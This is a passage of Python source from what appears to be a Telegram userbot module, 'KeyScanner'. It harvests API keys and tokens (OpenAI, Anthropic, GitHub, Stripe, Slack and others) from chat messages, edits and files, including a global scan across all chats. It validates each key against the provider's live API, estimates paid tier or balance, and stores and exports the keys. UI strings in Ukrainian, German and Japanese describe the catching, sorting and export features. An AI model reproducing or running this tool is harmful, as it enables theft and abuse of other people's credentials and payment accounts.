                payload = {"model": "llama3-8b-8192", "messages": [{"role": "user", "content": "hi"}], "max_tokens": 1}
                async with session.post("https://api.groq.com/openai/v1/chat/completions",
                                        headers=headers, json=payload, timeout=5) as r:
                    return "Groq", r.status == 200

            elif key.startswith("AIza"):
                payload = {"contents": [{"parts": [{"text": "hi"}]}]}
                async with session.post(
                    f"https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key={key}",
                    json=payload, timeout=5,
                ) as r:
                    # Explicitly check for 200 OK. 403 means permission denied (invalid key or bad region).
                    return "Gemini", r.status == 200

            elif key.startswith("sk-ant-"):
                ant_h = {"x-api-key": key, "anthropic-version": "2023-06-01"}
                async with session.get("https://api.anthropic.com/v1/models",
                                       headers=ant_h, timeout=5) as r:
                    if r.status == 200:
                        data = await r.json()
                        return "Anthropic", bool(data.get("data"))
                    return "Anthropic", False

            elif key.startswith("hf_"):
                async with session.get("https://huggingface.co/api/whoami-v2", headers=headers, timeout=5) as r:
                    return "HuggingFace", r.status == 200

            elif key.startswith("r8_"):
                async with session.get("https://api.replicate.com/v1/account",
                                       headers={"Authorization": f"Token {key}"}, timeout=5) as r:
                    return "Replicate", r.status == 200

            elif key.startswith(("ghp_", "github_pat_", "gho_", "ghs_", "ghu_")):
                async with session.get("https://api.github.com/user", headers=headers, timeout=5) as r:
                    return "GitHub", r.status == 200

            elif key.startswith("sk_live_"):
                async with session.get("https://api.stripe.com/v1/balance", headers=headers, timeout=5) as r:
                    return "Stripe", r.status == 200

            elif key.startswith("xox"):
                async with session.post("https://slack.com/api/auth.test", headers=headers, timeout=5) as r:
                    d = await r.json()
                    return "Slack", d.get("ok", False) is True

            elif key.startswith("SG."):
                async with session.get("https://api.sendgrid.com/v3/scopes", headers=headers, timeout=5) as r:
                    return "SendGrid", r.status == 200

            elif key.startswith("secret_"):
                async with session.get("https://api.notion.com/v1/users/me",
                    headers={"Authorization": f"Bearer {key}", "Notion-Version": "2022-06-28"}, timeout=5) as r:
                    return "Notion", r.status == 200

            elif key.startswith("figd_"):
                async with session.get("https://api.figma.com/v1/me",
                                       headers={"X-Figma-Token": key}, timeout=5) as r:
                    return "Figma", r.status == 200

            if key.startswith("sk-"):
                try:
                    async with session.get("https://api.openai.com/v1/models", headers=headers, timeout=4) as r:
                        if r.status == 200:
                            data = await r.json()
                            if data.get("data"):
                                # Check for codex quota (code-davinci-002 or completions endpoint viability)
                                try:
                                    payload = {"model": "gpt-3.5-turbo-instruct", "prompt": "hi", "max_tokens": 1}
                                    async with session.post("https://api.openai.com/v1/completions", headers=headers, json=payload, timeout=4) as cr:
                                        if cr.status == 429: # Quota exceeded
                                            return "OpenAI", False
                                except Exception:
                                    pass
                                return "OpenAI", True
                except Exception:
                    pass

                providers = [
                    ("DeepSeek",    "https://api.deepseek.com",                  "deepseek-chat"),
                    ("Perplexity",  "https://api.perplexity.ai",                 "sonar-small-chat"),
                    ("Mistral",     "https://api.mistral.ai/v1",                 "mistral-small-latest"),
                    ("Together",    "https://api.together.xyz/v1",               "meta-llama/Llama-3-8b-chat-hf"),
                    ("XAI",         "https://api.x.ai/v1",                       "grok-beta"),
                    ("Fireworks",   "https://api.fireworks.ai/inference/v1",     "accounts/fireworks/models/llama-v3-8b-instruct"),
                    ("Novita",      "https://api.novita.ai/v3",                  "meta-llama/llama-3-8b-instruct"),
                    ("SiliconFlow", "https://api.siliconflow.cn/v1",             "Qwen/Qwen2.5-7B-Instruct"),
                    ("DeepInfra",   "https://api.deepinfra.com/v1/openai",       "meta-llama/Meta-Llama-3-8B-Instruct"),
                    ("ZhipuAI",     "https://open.bigmodel.cn/api/paas/v4",      "glm-4-flash"),
                ]

                async def _test(name, base_url, fallback):
                    try:
                        model = fallback
                        try:
                            async with session.get(f"{base_url}/models", headers=headers, timeout=3) as rm:
                                if rm.status == 200:
                                    md = await rm.json()
                                    if md.get("data"):
                                        model = md["data"][0]["id"]
                        except Exception:
                            pass
                        payload = {"model": model, "messages": [{"role": "user", "content": "hi"}], "max_tokens": 1}
                        async with session.post(f"{base_url}/chat/completions",
                                                headers=headers, json=payload, timeout=6) as rc:
                            if rc.status == 200 and "choices" in await rc.json():
                                return name
                    except Exception:
                        pass
                    return None

                pending = [asyncio.create_task(_test(n, u, m)) for n, u, m in providers]
                while pending:
                    done, pending = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
                    for t in done:
                        try:
                            res = t.result()
                            if res:
                                for p in pending:
                                    p.cancel()
                                return res, True
                        except Exception:
                            pass
                return "Unknown", False

        except Exception:
            pass
        return "Unknown", False


    async def _gemini_paid_check(self, session, key: str) -> str:
        """
        Gemini has no single balance endpoint. We infer paid tier from the
        accessible model catalog: if the key can see any paid-tier-only model,
        it is very likely a paid project.
        """
        paid_only_prefixes = (
            "veo-3.1-",
            "veo-3.0-",
            "veo-2.0-",
            "lyria-3-",
            "gemini-2.5-computer-use-preview-10-2025",
        )

        try:
            async with session.get(
                "https://generativelanguage.googleapis.com/v1beta/models",
                params={"key": key, "pageSize": 1000},
                timeout=6,
            ) as r:
                if r.status != 200:
                    return "unknown"
                data = await r.json()
        except Exception:
            return "unknown"

        models = []
        for item in data.get("models", []) or []:
            name = (item.get("name") or "").removeprefix("models/")
            base = item.get("baseModelId") or ""
            models.append(name)
            models.append(base)

        if any(
            model.startswith(prefix)
            for model in models
            for prefix in paid_only_prefixes
        ):
            return "paid"

        free_basics = {
            "gemini-2.5-flash",
            "gemini-2.5-flash-lite",
            "gemini-2.5-pro",
            "gemini-2.0-flash",
            "gemini-1.5-flash",
            "gemini-1.5-pro",
            "gemini-embedding-001",
        }
        preview_models = [m for m in models if m.endswith("-preview") or "-preview-" in m]
        if preview_models and not any(m in free_basics for m in models):
            return "paid"

        return "free"

    async def _check_paid(self, session, key: str, provider: str, models=None) -> str:
        """Returns 'paid', 'free', or 'unknown'."""
        headers = {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}
        models = models or []
        try:
            if provider == "Gemini" or key.startswith("AIza"):
                if any(re.search(r"(veo|lyria|computer-use|imagen|2\.5-pro|3-pro|preview|experimental|thinking|ultra)", m, re.I) for m in models):
                    return "paid"
                return "unknown"

            if provider == "OpenAI" or (key.startswith("sk-") and not key.startswith(("sk-or-v1-", "sk-ant-"))):
                tier = self._openai_tier_from_models(models)
                # Try to get balance via usage API
                try:
                    async with session.get("https://api.openai.com/v1/dashboard/billing/credit_grants", headers=headers, timeout=5) as r:
                        if r.status == 200:
                            d = await r.json()
                            total = d.get("total_granted", 0)
                            used = d.get("total_used", 0)
                            bal = total - used
                            if bal > 0:
                                return f"paid (${bal:.2f})"
                except Exception:
                    pass
                
                if tier:
                    return tier
                async with session.get("https://api.openai.com/v1/models", headers=headers, timeout=5) as r:
                    if r.status == 200:
                        d = await r.json()
                        return self._openai_tier_from_models([item.get("id") for item in d.get("data", [])]) or "unknown"
                    return "unknown"

            elif provider == "Anthropic" or key.startswith("sk-ant-"):
                tier = self._anthropic_tier_from_models(models)
                ant_h = {"x-api-key": key, "anthropic-version": "2023-06-01"}
                async with session.get("https://api.anthropic.com/v1/models",
                                       headers=ant_h, timeout=5) as r:
                    if r.status == 200:
                        d = await r.json()
                        return self._anthropic_tier_from_models([item.get("id") for item in d.get("data", [])]) or "unknown"
                async with session.get("https://api.anthropic.com/v1/organizations",
                                       headers=ant_h, timeout=5) as r:
                    if r.status == 200:
                        d = await r.json()
                        for org in d.get("data", []):
                            if org.get("billing_type", "") not in ("free_tier", ""):
                                return "paid"
                        return tier or "free"

            elif provider == "OpenRouter" or key.startswith("sk-or-v1-"):
                tier = self._openrouter_tier_from_models(models)
                async with session.get("https://openrouter.ai/api/v1/auth/key",
                                       headers=headers, timeout=5) as r:
                    if r.status == 200:
                        d       = await r.json()
                        credits = d.get("data", {}).get("limit", None)
                        usage = d.get("data", {}).get("usage", 0)
                        is_free = d.get("data", {}).get("is_free_tier", True)
                        
                        if credits is not None and usage is not None:
                            balance = credits - usage
                            if balance > 0:
                                return f"paid (${balance:.2f})"
                        
                        return "paid" if (not is_free or (credits and credits > 1)) else (tier or "free")

            elif provider == "Stripe" or key.startswith("sk_live_"):
                async with session.get("https://api.stripe.com/v1/balance",
                                       headers=headers, timeout=5) as r:
                    if r.status == 200:
                        d     = await r.json()
                        total = sum(a.get("amount", 0) for a in d.get("available", []))
                        return "paid" if total > 0 else "free"

            elif provider in ("Gemini",) or key.startswith("AIza"):
                return "unknown"

            elif provider == "Groq" or key.startswith("gsk_"):
                return "unknown"

        except Exception:
            pass
        return "unknown"

    
    strings_uk = {
        "scanning":      f"{E_SLOW} <b>Швидкий пошук ключів...</b>\n{E_FOLD} Пошук до {{limit}} повідомлень на префікс.",
        "found":         f"{E_OK} <b>Сканування завершено!</b>\n{E_FIRE} Нових валідних ключів: <b>{{valid_count}}</b>\n{E_BATT} Збережено.",
        "auto_on":       f"{E_BELL} Авто-ловля <b>увімкнена</b>.\n{E_MSG} Ловлю: нові повідомлення · правки · файли",
        "auto_off":      f"{E_MUTE} Авто-ловля <b>вимкнена</b>.",
        "db_stats":      f"{E_BOX} <b>База ключів:</b> {{total}}\n{E_CARD} Платних: <b>{{paid}}</b>  {E_BATT} Безкоштовних: <b>{{free}}</b>  ❓ Невідомо: <b>{{unk}}</b>\n\n{E_GEAR} <b>Управління:</b>",
        "stats":         f"{E_PIN} <b>Провайдери / ключі / моделі:</b>\n{{stats_text}}",
        "exported":      f"{E_COPY} <b>Ключі вивантажені в Обрані!</b>",
        "empty":         f"{E_ERR} База порожня.",
        "deleted":       f"{E_TRASH} Ключ видалено.",
        "not_found":     f"{E_ERR} Ключ не знайдено.",
        "btn_export":    "⬇️ Вивантажити",
        "btn_stats":     "📍 Статистика",
        "btn_clear":     "🗑 Очистити все",
        "btn_list":      "📝 Список",
        "btn_check_all": "🔃 Перевірити все",
        "btn_back":      "⬅️ Назад",
        "btn_exp_json":  "JSON",
        "btn_exp_txt":   "TXT",
        "btn_clr_inv":   "🗑 Видалити невалід",
        "models_cache_missing": f"{E_ERR} <b>Кеш моделей не готовий.</b>\n{E_GEAR} Спочатку натисни <b>💳 Сортувати Платн / Безкошт</b>.",
        "log_target_help": f"{E_LINK} <b>Чат логів не задано.</b>\nВикористовуй <code>.kslogchat &lt;посилання / @username / chat_id&gt; [назва топіку]</code>.",
        "log_target_set": f"{E_OK} <b>Чат логів збережено.</b>",
        "log_target_topic": f"{E_OK} <b>Топік форуму готовий.</b>",
        "log_target_label": f"{E_LINK} <b>Чат логів:</b> {{target}}",
        "log_topic_label": f"{E_FOLD2} <b>Топік логів:</b> {{topic}}",
        "log_topic_none": f"{E_ERR} <b>Топік не задано.</b>",
        "btn_log_target": "🎯 Чат логів",
        "btn_log_topic": "🧵 Назва топіку",
        "btn_log_help": "ℹ️ Допомога по логах",
        "new_key_auto":  f"{E_BELL} <b>Спійманий новий ключ!</b>\nПровайдер: <b>{{provider}}</b>",
        "list_title":    f"{E_LIST} <b>Список (Стор. {{page}}/{{total_pages}}):</b>",
        "key_info":      f"{E_PIN} <b>Інформація про ключ:</b>\n\n{E_TAG} <b>Провайдер:</b> {{provider}}\n{E_CARD} <b>Тариф:</b> {{tier}}\n{E_LIST} <b>Моделі:</b> {{models}}\n{E_LOCK} <b>Ключ:</b> <code>{{key}}</code>",
        "btn_check_single": "🔃 Перевірити",
        "btn_del_single":   "🗑 Видалити",
        "checking_all":  f"{E_SYNC} <b>Перевіряю {{total}} ключів...</b>",
        "check_res_all": f"{E_OK} <b>Перевірка завершена</b>\n\n<b>Всього:</b> {{total}}\n<b>Валідно:</b> {{v}}\n<b>Невалідно:</b> {{i}}\n\n{E_PIN} <b>Провайдери:</b>\n{{prov_stats}}",
        "check_res_single": f"{E_SYNC} <b>Результат перевірки:</b>\n\n<b>Провайдер:</b> {{provider}}\n<b>Статус:</b> {{status}}",
        "status_valid":   f"{E_OK} Валід",
        "status_invalid": f"{E_ERR} Невалід",
        "importing":     f"{E_SYNC} <b>Імпорт ключів...</b>",
        "imported":      f"{E_OK} <b>Успішно імпортовано {{count}} нових ключів.</b>",
        "import_err":    f"{E_ERR} Реплай на повідомлення/файл або вкажіть raw посилання.",
        "btn_settings":  "⚙️ Налаштування",
        "settings_title": f"{E_GEAR} <b>Налаштування:</b>\n\n{E_BELL} Логи: <b>{{log_mode}}</b>\n{E_FOLD} Файли: <b>{{file_scan}}</b>\n{E_SYNC} Правки: <b>{{edit_scan}}</b>",
        "btn_log_cycle": "🔔 Змінити режим логів",
        "btn_toggle_file": "📂 Вкл/викл файли",
        "btn_toggle_edit": "🔃 Вкл/викл правки",
        "log_mode_heroku": "heroku",
        "log_mode_custom": "custom",
        "heroku_topic_creating": f"{E_GEAR} <b>[KeyScanner] Utils create topic</b> · {{title}}",
        "heroku_topic_created": f"{E_OK} <b>[KeyScanner] Топік створено</b> · {{title}} · thread_id=<code>{{thread_id}}</code>",
        "heroku_topic_saved": f"{E_FOLD2} <b>[KeyScanner] Топік збережено в БД</b> · {{title}} · thread_id=<code>{{thread_id}}</code>",
        "heroku_topic_intro": "This topic is for automatic key logs. The first message is pinned for context and updates.",
        "global_scanning": f"{E_SLOW} <b>Глобальний пошук...</b>\nШукаю в усіх чатах до {{limit}} повідомлень на префікс.",
        "new_key_notif": f"{E_BELL} <b>Спійманий новий ключ!</b>\n{E_TAG} <b>Провайдер:</b> {{provider}}\n{E_LOCK} <b>Ключ:</b> <code>{{key}}</code>\n{E_FOLD2} <b>Джерело:</b> {{chat_id}}\n{E_RIGHT} <b>Звідки:</b> {{via}}",
        "btn_show_key":  "👁 Показати",
        "btn_hide_key":  "🙈 Сховати",
        "btn_filter_all":     "📝 Всі",
        "btn_filter_paid":    "💳 Платні",
        "btn_filter_free":    "🔋 Безкоштовні",
        "btn_sort_paid_free": "💳 Сортувати Платн/Безкошт",
        "btn_del_free":       "🗑 Видалити безкоштовні",
        "btn_del_paid":       "🗑 Видалити платні",
        "btn_exp_paid":       "💳 Вивантажити платні",
        "btn_exp_free":       "🔋 Вивантажити безкоштовні",
        "sorting":       f"{E_SYNC} <b>Сортування платні/безкоштовні...</b>\n{{done}}/{{total}}",
        "sort_done":     f"{E_OK} <b>Сортування завершено!</b>\n\n{E_CARD} <b>Платних:</b> {{paid}}\n{E_BATT} <b>Безкоштовних:</b> {{free}}\n❓ <b>Невідомо:</b> {{unknown}}",
        "deleted_filter": f"{E_TRASH} Видалено <b>{{count}}</b> ключів.",
    }

    strings_de = {
        "scanning":      f"{E_SLOW} <b>Schnellsuche nach Schlüsseln...</b>\n{E_FOLD} Suche bis zu {{limit}} Nachrichten pro Präfix.",
        "found":         f"{E_OK} <b>Scan abgeschlossen!</b>\n{E_FIRE} Neue gültige Schlüssel: <b>{{valid_count}}</b>\n{E_BATT} Gespeichert.",
        "auto_on":       f"{E_BELL} Auto-Scan <b>aktiviert</b>.\n{E_MSG} Erfasse: neue Nachrichten · Bearbeitungen · Dateien",
        "auto_off":      f"{E_MUTE} Auto-Scan <b>deaktiviert</b>.",
        "db_stats":      f"{E_BOX} <b>Schlüsseldatenbank:</b> {{total}}\n{E_CARD} Bezahlt: <b>{{paid}}</b>  {E_BATT} Kostenlos: <b>{{free}}</b>  ❓ Unbekannt: <b>{{unk}}</b>\n\n{E_GEAR} <b>Verwaltung:</b>",
        "stats":         f"{E_PIN} <b>Anbieter / Schlüssel / Modelle:</b>\n{{stats_text}}",
        "exported":      f"{E_COPY} <b>Schlüssel in Gespeicherte Nachrichten exportiert!</b>",
        "empty":         f"{E_ERR} Datenbank ist leer.",
        "deleted":       f"{E_TRASH} Schlüssel entfernt.",
        "not_found":     f"{E_ERR} Schlüssel nicht gefunden.",
        "btn_export":    "⬇️ Exportieren",
        "btn_stats":     "📍 Statistik",
        "btn_clear":     "🗑 Alles löschen",
        "btn_list":      "📝 Liste",
        "btn_check_all": "🔃 Alle prüfen",
        "btn_back":      "⬅️ Zurück",
        "btn_exp_json":  "JSON",
        "btn_exp_txt":   "TXT",
        "btn_clr_inv":   "🗑 Ungültige löschen",
        "models_cache_missing": f"{E_ERR} <b>Modell-Cache noch nicht bereit.</b>\n{E_GEAR} Bitte zuerst <b>💳 Bezahlt / Kostenlos sortieren</b> drücken.",
        "log_target_help": f"{E_LINK} <b>Log-Chat nicht gesetzt.</b>\nNutze <code>.kslogchat &lt;Link / @username / chat_id&gt; [Thema]</code>.",
        "log_target_set": f"{E_OK} <b>Log-Chat gespeichert.</b>",
        "log_target_topic": f"{E_OK} <b>Forum-Thema bereit.</b>",
        "log_target_label": f"{E_LINK} <b>Log-Ziel:</b> {{target}}",
        "log_topic_label": f"{E_FOLD2} <b>Log-Thema:</b> {{topic}}",
        "log_topic_none": f"{E_ERR} <b>Kein Thema gesetzt.</b>",
        "btn_log_target": "🎯 Log-Chat setzen",
        "btn_log_topic": "🧵 Thementitel setzen",
        "btn_log_help": "ℹ️ Log-Hilfe",
        "new_key_auto":  f"{E_BELL} <b>Neuer Schlüssel gefangen!</b>\nAnbieter: <b>{{provider}}</b>",
        "list_title":    f"{E_LIST} <b>Schlüsselliste (Seite {{page}}/{{total_pages}}):</b>",
        "key_info":      f"{E_PIN} <b>Schlüsselinfo:</b>\n\n{E_TAG} <b>Anbieter:</b> {{provider}}\n{E_CARD} <b>Tarif:</b> {{tier}}\n{E_LIST} <b>Modelle:</b> {{models}}\n{E_LOCK} <b>Schlüssel:</b> <code>{{key}}</code>",
        "btn_check_single": "🔃 Prüfen",
        "btn_del_single":   "🗑 Löschen",
        "checking_all":  f"{E_SYNC} <b>Prüfe {{total}} Schlüssel...</b>",
        "check_res_all": f"{E_OK} <b>Prüfung abgeschlossen</b>\n\n<b>Gesamt:</b> {{total}}\n<b>Gültig:</b> {{v}}\n<b>Ungültig:</b> {{i}}\n\n{E_PIN} <b>Anbieter:</b>\n{{prov_stats}}",
        "check_res_single": f"{E_SYNC} <b>Prüfergebnis:</b>\n\n<b>Anbieter:</b> {{provider}}\n<b>Status:</b> {{status}}",
        "status_valid":   f"{E_OK} Gültig",
        "status_invalid": f"{E_ERR} Ungültig",
        "importing":     f"{E_SYNC} <b>Schlüssel werden importiert...</b>",
        "imported":      f"{E_OK} <b>Erfolgreich {{count}} neue Schlüssel importiert.</b>",
        "import_err":    f"{E_ERR} Antworte auf eine Nachricht/Datei oder gib eine Raw-URL an.",
        "btn_settings":  "⚙️ Einstellungen",
        "settings_title": f"{E_GEAR} <b>Einstellungen:</b>\n\n{E_BELL} Logging: <b>{{log_mode}}</b>\n{E_FOLD} Dateiscan: <b>{{file_scan}}</b>\n{E_SYNC} Bearbeitungsscan: <b>{{edit_scan}}</b>",
        "btn_log_cycle": "🔔 Log-Modus wechseln",
        "btn_toggle_file": "📂 Dateiscan umschalten",
        "btn_toggle_edit": "🔃 Bearbeitungsscan umschalten",
        "log_mode_heroku": "heroku",
        "log_mode_custom": "custom",
        "heroku_topic_creating": f"{E_GEAR} <b>[KeyScanner] Utils create topic</b> · {{title}}",
        "heroku_topic_created": f"{E_OK} <b>[KeyScanner] Thema erstellt</b> · {{title}} · thread_id=<code>{{thread_id}}</code>",
        "heroku_topic_saved": f"{E_FOLD2} <b>[KeyScanner] Thema in DB gespeichert</b> · {{title}} · thread_id=<code>{{thread_id}}</code>",
        "heroku_topic_intro": "This topic is for automatic key logs. The first message is pinned for context and updates.",
        "global_scanning": f"{E_SLOW} <b>Globaler Scan gestartet...</b>\nDurchsuche alle Chats bis zu {{limit}} Nachrichten pro Präfix.",
        "new_key_notif": f"{E_BELL} <b>Neuer Schlüssel gefangen!</b>\n{E_TAG} <b>Anbieter:</b> {{provider}}\n{E_LOCK} <b>Schlüssel:</b> <code>{{key}}</code>\n{E_FOLD2} <b>Quelle:</b> {{chat_id}}\n{E_RIGHT} <b>Via:</b> {{via}}",
        "btn_show_key":  "👁 Anzeigen",
        "btn_hide_key":  "🙈 Verbergen",
        "btn_filter_all":     "📝 Alle",
        "btn_filter_paid":    "💳 Bezahlt",
        "btn_filter_free":    "🔋 Kostenlos",
        "btn_sort_paid_free": "💳 Bezahlt/Kostenlos sortieren",
        "btn_del_free":       "🗑 Kostenlose löschen",
        "btn_del_paid":       "🗑 Bezahlte löschen",
        "btn_exp_paid":       "💳 Bezahlte exportieren",
        "btn_exp_free":       "🔋 Kostenlose exportieren",
        "sorting":       f"{E_SYNC} <b>Sortiere bezahlt/kostenlos...</b>\n{{done}}/{{total}}",
        "sort_done":     f"{E_OK} <b>Sortierung abgeschlossen!</b>\n\n{E_CARD} <b>Bezahlt:</b> {{paid}}\n{E_BATT} <b>Kostenlos:</b> {{free}}\n❓ <b>Unbekannt:</b> {{unknown}}",
        "deleted_filter": f"{E_TRASH} <b>{{count}}</b> Schlüssel gelöscht.",
    }

    strings_jp = {
        "scanning":      f"{E_SLOW} <b>キースキャン中...</b>\n{E_FOLD} 各プレフィックスで最大 {{limit}} 件検索。",
        "found":         f"{E_OK} <b>スキャン完了！</b>\n{E_FIRE} 新規有効キー: <b>{{valid_count}}</b>\n{E_BATT} 保存済み。",
        "auto_on":       f"{E_BELL} 自動キャッチ <b>有効</b>。\n{E_MSG} 対象: 新着メッセージ · 編集 · ファイル",
        "auto_off":      f"{E_MUTE} 自動キャッチ <b>無効</b>。",
        "auto_on_global":  f"{E_BELL} グローバル自動キャッチ <b>有効</b>。\n{E_MSG} <b>全チャット</b>の新着メッセージ・編集・ファイルを監視します。",
        "auto_off_global": f"{E_MUTE} グローバル自動キャッチ <b>無効</b>。",
        "db_stats":      f"{E_BOX} <b>キーDB:</b> {{total}}\n{E_CARD} 有料: <b>{{paid}}</b>  {E_BATT} 無料: <b>{{free}}</b>  ❓ 不明: <b>{{unk}}</b>\n\n{E_GEAR} <b>管理メニュー:</b>",
        "stats":         f"{E_PIN} <b>プロバイダ / キー / モデル:</b>\n{{stats_text}}",
        "exported":      f"{E_COPY} <b>キーをお気に入りにエクスポートしました！</b>",
        "empty":         f"{E_ERR} DBは空です。",
        "deleted":       f"{E_TRASH} キーを削除しました。",
        "not_found":     f"{E_ERR} キーが見つかりません。",
        "btn_export":    "⬇️ エクスポート",
        "btn_stats":     "📍 統計",
        "btn_clear":     "🗑 全削除",
        "btn_list":      "📝 リスト",
        "btn_check_all": "🔃 全検証",
        "btn_back":      "⬅️ 戻る",
        "btn_exp_json":  "JSON",
        "btn_exp_txt":   "TXT",
        "btn_clr_inv":   "🗑 無効削除",
        "models_cache_missing": f"{E_ERR} <b>モデルキャッシュ未準備。</b>\n{E_GEAR} 先に <b>💳 有料/無料ソート</b> を押してください。",
        "log_target_help": f"{E_LINK} <b>ログチャット未設定。</b>\n<code>.kslogchat &lt;リンク / @username / chat_id&gt; [トピック名]</code> で設定。",
        "log_target_set": f"{E_OK} <b>ログチャット保存済み。</b>",
        "log_target_topic": f"{E_OK} <b>フォーラムトピック準備完了。</b>",
        "log_target_label": f"{E_LINK} <b>ログ先:</b> {{target}}",
        "log_topic_label": f"{E_FOLD2} <b>ログトピック:</b> {{topic}}",
        "log_topic_none": f"{E_ERR} <b>トピック未設定。</b>",
        "btn_log_target": "🎯 ログチャット設定",
        "btn_log_topic": "🧵 トピック名設定",
        "btn_log_help": "ℹ️ ログヘルプ",
        "new_key_auto":  f"{E_BELL} <b>新規キーをキャッチ！</b>\nプロバイダ: <b>{{provider}}</b>",
        "list_title":    f"{E_LIST} <b>キー一覧</b>\nページ <b>{{page}}/{{total_pages}}</b> ・ {{sort_label}} ・ {{filter_label}}\n表示中: <b>{{shown_count}}</b>",
        "key_info":      f"{E_PIN} <b>キー情報:</b>\n\n{E_TAG} <b>プロバイダ:</b> {{provider}}\n{E_CARD} <b>プラン:</b> {{tier}}\n{E_LIST} <b>モデル:</b> {{models}}\n{E_LOCK} <b>キー:</b> <code>{{key}}</code>",
        "btn_check_single": "🔃 検証",
        "btn_del_single":   "🗑 削除",
        "checking_all":  f"{E_SYNC} <b>{{total}} 件のキーを検証中...</b>",
        "check_res_all": f"{E_OK} <b>検証完了</b>\n\n<b>合計:</b> {{total}}\n<b>有効:</b> {{v}}\n<b>無効:</b> {{i}}\n\n{E_PIN} <b>プロバイダ:</b>\n{{prov_stats}}",
        "check_res_single": f"{E_SYNC} <b>検証結果:</b>\n\n<b>プロバイダ:</b> {{provider}}\n<b>ステータス:</b> {{status}}",
        "status_valid":   f"{E_OK} 有効",
        "status_invalid": f"{E_ERR} 無効",
        "importing":     f"{E_SYNC} <b>キーをインポート中...</b>",
        "imported":      f"{E_OK} <b>{{count}} 件の新規キーをインポートしました。</b>",
        "import_err":    f"{E_ERR} メッセージ/ファイルにリプライするか、raw URLを指定してください。",
        "btn_settings":  "⚙️ 設定",
        "settings_title": f"{E_GEAR} <b>設定:</b>\n\n{E_BELL} ログ: <b>{{log_mode}}</b>\n{E_FOLD} ファイルスキャン: <b>{{file_scan}}</b>\n{E_SYNC} 編集スキャン: <b>{{edit_scan}}</b>",
        "btn_log_cycle": "🔔 ログモード切替",
        "btn_toggle_file": "📂 ファイルスキャン切替",
        "btn_toggle_edit": "🔃 編集スキャン切替",
        "log_mode_heroku": "heroku",
        "log_mode_custom": "custom",
        "heroku_topic_creating": f"{E_GEAR} <b>[KeyScanner] Utils create topic</b> · {{title}}",
        "heroku_topic_created": f"{E_OK} <b>[KeyScanner] トピック作成済み</b> · {{title}} · thread_id=<code>{{thread_id}}</code>",
        "heroku_topic_saved": f"{E_FOLD2} <b>[KeyScanner] トピックをDBに保存</b> · {{title}} · thread_id=<code>{{thread_id}}</code>",
        "heroku_topic_intro": "This topic is for automatic key logs. The first message is pinned for context and updates.",
        "global_scanning": f"{E_SLOW} <b>グローバルスキャン開始...</b>\n全チャットで各プレフィックス最大 {{limit}} 件検索。",
        "new_key_notif": f"{E_BELL} <b>新規キーをキャッチ！</b>\n{E_TAG} <b>プロバイダ:</b> {{provider}}\n{E_LOCK} <b>キー:</b> <code>{{key}}</code>\n{E_FOLD2} <b>ソース:</b> {{chat_id}}\n{E_RIGHT} <b>経由:</b> {{via}}",
        "btn_show_key":  "👁 表示",
        "btn_hide_key":  "🙈 隠す",
        "btn_filter_all":     "📝 全て",
        "btn_filter_paid":    "💳 有料",
        "btn_filter_free":    "🔋 無料",
        "btn_filter_provider": "🏷 プロバイダ",
        "btn_filter_reset": "✖️ リセット",
        "btn_sort_menu": "🧭 並び替え",
        "btn_sort_recent":    "🕒 新着順",
        "btn_sort_alpha":     "🔤 A-Z",
        "btn_sort_provider":  "🏷 プロバイダ",
        "btn_sort_tier":      "💳 プラン",
        "sort_label_recent":   "新着順",
        "sort_label_alpha":    "A-Z",
        "sort_label_provider": "プロバイダ",
        "sort_label_tier":     "プラン",
        "filter_label_all": "全て",
        "filter_label_paid": "有料",
        "filter_label_free": "無料",
        "provider_menu_title": f"{E_TAG} <b>プロバイダ絞り込み</b>\nプロバイダを1つ選択してください。",
        "sort_menu_title": f"{E_SYNC} <b>並び替え</b>\n表示順を選択してください。",
        "btn_sort_paid_free": "💳 有料/無料ソート",
        "btn_del_free":       "🗑 無料を削除",
        "btn_del_paid":       "🗑 有料を削除",
        "btn_exp_paid":       "💳 有料をエクスポート",
        "btn_exp_free":       "🔋 無料をエクスポート",
        "sorting":       f"{E_SYNC} <b>有料/無料ソート中...</b>\n{{done}}/{{total}}",
        "sort_done":     f"{E_OK} <b>ソート完了！</b>\n\n{E_CARD} <b>有料:</b> {{paid}}\n{E_BATT} <b>無料:</b> {{free}}\n❓ <b>不明:</b> {{unknown}}",
        "deleted_filter": f"{E_TRASH} <b>{{count}}</b> 件のキーを削除。",
        "settings_overview": (
            f"{E_GEAR} <b>設定ハブ</b>\n\n"
            f"{E_BELL} キャッチ: このチャット <b>{{auto_chat}}</b> ・ global <b>{{auto_global}}</b>\n"
            f"{E_FOLD} ファイル <b>{{file_scan}}</b> ・ 編集 <b>{{edit_scan}}</b> ・ 通知 <b>{{notify_new_keys}}</b>\n"
            f"{E_LIST} 表示: compact <b>{{compact}}</b> ・ キー非表示 <b>{{auto_hide}}</b>\n"
            f"{E_RIGHT} 1ページ <b>{{page_size}}</b> 件 ・ 既定ソート <b>{{default_sort}}</b>\n"
            f"{E_LINK} ログ: <b>{{log_mode}}</b>\n{{log_target_line}}"
        ),
        "settings_capture_title": (
            f"{E_BELL} <b>キャッチ設定</b>\n\n"
            f"このチャットの自動キャッチ: <b>{{auto_chat}}</b>\n"
            f"グローバル自動キャッチ: <b>{{auto_global}}</b>\n"
            f"ファイルスキャン: <b>{{file_scan}}</b>\n"
            f"編集スキャン: <b>{{edit_scan}}</b>\n"
            f"新規キー通知: <b>{{notify_new_keys}}</b>"
        ),
        "settings_view_title": (
            f"{E_LIST} <b>表示設定</b>\n\n"
            f"コンパクト表示: <b>{{compact}}</b>\n"
            f"キー自動非表示: <b>{{auto_hide}}</b>\n"
            f"ページサイズ: <b>{{page_size}}</b>\n"
            f"既定ソート: <b>{{default_sort}}</b>"
        ),
        "settings_logs_title": (
            f"{E_LINK} <b>ログ設定</b>\n\n"
            f"モード: <b>{{log_mode}}</b>\n"
            f"送信先: {{target}}\n"
            f"トピック: {{topic}}"
        ),
        "btn_capture_settings": "🎣 キャッチ",
        "btn_view_settings": "📱 表示",
        "btn_logs_settings": "🧾 ログ",
        "btn_toggle_auto_chat": "💬 このチャットで自動",
        "btn_toggle_auto_global": "🌍 global 自動",
        "btn_toggle_notify": "🔔 新規キー通知",
        "btn_toggle_compact": "📱 compact 表示",
        "btn_cycle_page_size": "↕️ ページサイズ",
        "btn_cycle_default_sort": "🧭 既定ソート",
        "btn_toggle_autohide": "🙈 キー自動非表示",
        "btn_open_list": "📝 一覧を開く",
        "btn_open_export": "⬇️ エクスポート",
